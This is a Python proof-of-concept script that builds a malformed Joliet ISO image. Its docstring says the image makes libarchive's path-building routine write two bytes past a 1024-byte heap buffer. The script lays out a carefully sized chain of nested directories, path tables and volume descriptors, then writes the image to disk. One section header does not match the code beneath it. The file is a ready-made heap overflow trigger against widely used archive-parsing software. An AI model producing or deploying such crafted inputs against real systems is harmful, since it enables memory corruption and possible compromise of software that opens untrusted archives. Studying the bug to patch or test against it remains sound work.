#!/usr/bin/env python3
import struct

SECTOR = 2048

# --------------------------------------------------------------------------- helpers
def both16(v):
    return struct.pack("<H", v) + struct.pack(">H", v)

def both32(v):
    return struct.pack("<I", v) + struct.pack(">I", v)

# --------------------------------------------------------------------------- ISO9660 Joliet
def build_joliet_iso():
    """
    Craft per libarchive upstream 750e8d7b25de (fix Apple shipped in 27.2, absent on 27.0).

    build_pathname_utf16be() recurses to the parent, then writes a 2-byte UTF-16BE '/'
    separator WITHOUT re-checking the running length against max (1024). A directory
    chain whose accumulated path is exactly 1024 bytes makes the deepest unwind store at
    p[1024] / p[1025] — two bytes past a malloc(1024) heap buffer.

    Chain: root -> A(103 chars) -> B(103) -> C(103) -> D(103) -> E(96), file F in E.
    Accumulated: 4*206 + 192 + 4*2 = 1024 exactly.
    """
    names = ["A" * 103, "B" * 103, "C" * 103, "D" * 103, "E" * 96]

    # sector plan
    LBA_PVD = 16
    LBA_SVD = 17
    LBA_TERM = 18
    LBA_PT_ASCII = 19
    LBA_PT_JOLIET = 20
    LBA_ROOT = 21
    first_dir = LBA_ROOT + 1          # 22 .. 26
    LBA_FILE = first_dir + len(names)  # 27
    total_sectors = LBA_FILE + 1

    img = bytearray(total_sectors * SECTOR)

    def put(lba, data):
        img[lba * SECTOR: lba * SECTOR + len(data)] = data

    # ---- path tables (type L, little endian extents)
    def path_table(encode):
        out = bytearray()
        entries = [("", 1, LBA_ROOT)] + [(n, i + 2, first_dir + i) for i, n in enumerate(names)]
        for name, parent, extent in entries:
            nb = encode(name) if name else b"\x00"
            rec = bytes([len(nb), 0]) + struct.pack("<I", extent) + struct.pack("<H", parent) + nb
            if len(rec) % 2:
                rec += b"\x00"
            out += rec
        return bytes(out)

    pt_ascii = path_table(lambda s: s.encode("ascii"))
    pt_joliet = path_table(ucs2)
    put(LBA_PT_ASCII, pt_ascii)
    put(LBA_PT_JOLIET, pt_joliet)

    # ---- directories
    def build_dir(lba, parent_lba, children):
        """children: list of (name_bytes, extent, size, flags)"""
        body = bytearray()
        body += dir_record(b"\x00", lba, SECTOR, 0x02)      # '.'
        body += dir_record(b"\x01", parent_lba, SECTOR, 0x02)  # '..'
        for nb, ext, size, flags in children:
            body += dir_record(nb, ext, size, flags)
        return pad_to(bytes(body), SECTOR)

    # root contains A
    put(LBA_ROOT, build_dir(LBA_ROOT, LBA_ROOT,
                            [(ucs2(names[0]), first_dir, SECTOR, 0x02)]))
    for i, name in enumerate(names):
        lba = first_dir + i
        parent = LBA_ROOT if i == 0 else first_dir + i - 1
        kids = []
        if i + 1 < len(names):
            kids.append((ucs2(names[i + 1]), first_dir + i + 1, SECTOR, 0x02))
        else:
            kids.append((ucs2("F"), LBA_FILE, 0, 0x00))
        put(lba, build_dir(lba, parent, kids))

    put(LBA_FILE, b"")

    # ---- volume descriptors
    def volume_descriptor(kind, joliet, root_lba, pt_lba, pt_size):
        d = bytearray(2048)
        d[0] = kind
        d[1:6] = b"CD001"
        d[6] = 1
        if joliet:
            d[8:8 + 32] = ucs2("CINDER27".ljust(16))
            d[40:40 + 32] = ucs2("JOLIET-OOB".ljust(16))
        else:
            d[8:8 + 32] = b"CINDER27".ljust(32, b" ")
            d[40:40 + 32] = b"JOLIET-OOB".ljust(32, b" ")
        d[80:88] = both32(total_sectors)
        d[120:124] = both16(1)          # volume set size
        d[124:128] = both16(1)          # volume sequence number
        d[128:132] = both16(SECTOR)     # logical block size
        d[132:140] = both32(pt_size)    # path table size (both endian)
        d[140:144] = struct.pack("<I", pt_lba)   # type-L path table location
        d[144:148] = struct.pack("<I", 0)        # optional type-L
        d[148:152] = struct.pack(">I", 0)        # type-M (unused)
        d[152:156] = struct.pack(">I", 0)        # optional type-M
        # root directory record at offset 156
        root = dir_record(b"\x00", root_lba, SECTOR, 0x02)
        d[156:156 + len(root)] = root
        d[881] = 1                      # file structure version
        if joliet:
            d[88:88 + 3] = b"%/E"       # escape sequence
        return bytes(d)

    put(LBA_PVD, volume_descriptor(1, False, LBA_ROOT, LBA_PT_ASCII, len(pt_ascii)))
    put(LBA_SVD, volume_descriptor(2, True, LBA_ROOT, LBA_PT_JOLIET, len(pt_joliet)))
    term = bytearray(2048)
    term[0] = 255
    term[1:6] = b"CD001"
    term[6] = 1
    put(LBA_TERM, bytes(term))

    return bytes(img)


# --------------------------------------------------------------------------- USDA nesting

def dir_record(name_bytes, extent, size, flags):
    """ISO9660 directory record. name_bytes is the raw name (0x00 root, 0x01 parent)."""
    body = bytes([0]) + both32(extent) + both32(size) + iso_date() + bytes([flags, 0, 0]) + both16(1)
    rec = bytes([0]) + body + bytes([len(name_bytes)]) + name_bytes
    if len(rec) % 2:
        rec += b"\x00"
    rec = bytes([len(rec)]) + rec[1:]
    return rec

def iso_date(y=2026, mo=10, d=28, h=12, mi=0, s=0):
    return bytes([y - 1900, mo, d, h, mi, s, 0])

def pad_to(data, n):
    if len(data) < n:
        data = data + b"\x00" * (n - len(data))
    return data[:n]

def ucs2(name):
    return name.encode("utf-16-be")


# --------------------------------------------------------------------------- ISO9660 Joliet

if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "joliet_path_oob.iso"
    open(out, "wb").write(build_joliet_iso())
    print("wrote", out)
